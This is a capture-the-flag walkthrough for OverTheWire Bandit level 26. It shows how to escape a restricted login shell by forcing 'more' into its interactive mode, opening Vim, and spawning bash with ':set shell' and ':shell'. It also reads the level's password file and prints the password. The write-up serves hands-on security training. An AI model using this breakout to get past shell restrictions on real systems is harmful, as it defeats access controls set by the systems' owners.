## Overview

In this level, we are tasked with breaking out of a restricted shell for user `bandit26`. The default shell for user `bandit26` is not `/bin/bash`, but `/usr/bin/showtext`, which runs a script. Our goal is to find a way to escape this shell, spawn a new shell, and retrieve the password for Bandit Level 26.

---

## A little bit of Theory

In this level, we leverage the concept of interactive shells and **Vim**. The `more` command is used to view files, and we can exploit its interactive mode to open **Vim**. In **Vim**, we can use the `:shell` command to spawn the default shell for the user. Additionally, we can change the shell in Vim to `/bin/bash` using `:set shell=/bin/bash` and then run `:shell` to get an interactive shell.

---

## Solution

### Step 1: Check the default shell for `bandit26`

We first need to check which shell is being used for `bandit26`. We can do this by examining the `/etc/passwd` file:

```bash
bandit25@bandit:~$ cat /etc/passwd | grep bandit26
```

### Output:

```
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
```

From this output, we can see that the default shell for `bandit26` is `/usr/bin/showtext`.

### Step 2: Inspect the `showtext` script

Next, we examine the contents of the `showtext` script, which is responsible for launching the shell. We check its permissions and content:

```bash
bandit25@bandit:~$ ls -la /usr/bin/showtext
```

Output:

```
-rwxr-xr-x 1 root root 53 May 7 2020 /usr/bin/showtext
```

Now, let's look at the script itself:

```bash
bandit25@bandit:~$ cat /usr/bin/showtext
```

Output:

```bash
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0
```

This script runs `more` to display the `text.txt` file and then exits.

### Step 3: Trigger interactive mode in `more`

Since the script uses `more`, we can take advantage of its interactive mode. By making the terminal window smaller, we can force `more` into interactive mode, allowing us to use `v` to open the file in **Vim**.

### Step 4: Open Vim and break out

Once in Vim, we can open the password file for `bandit26` and retrieve the password. To do this, run the following command inside Vim:

```bash
:e /etc/bandit_pass/bandit26
```

If we want a shell, we can change the default shell to `/bin/bash` with the following command:

```bash
:set shell=/bin/bash
:shell
```

Now, we have access to a real shell.

### Step 5: Retrieve the password

After breaking out into a bash shell, we can retrieve the password for `bandit26` by running:

```bash
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
```

### Output:

```
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
```

The password for **Bandit Level 26** is:

`s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ`

---

## Official Level Link

[Bandit Level 26](https://overthewire.org/wargames/bandit/bandit26.html)

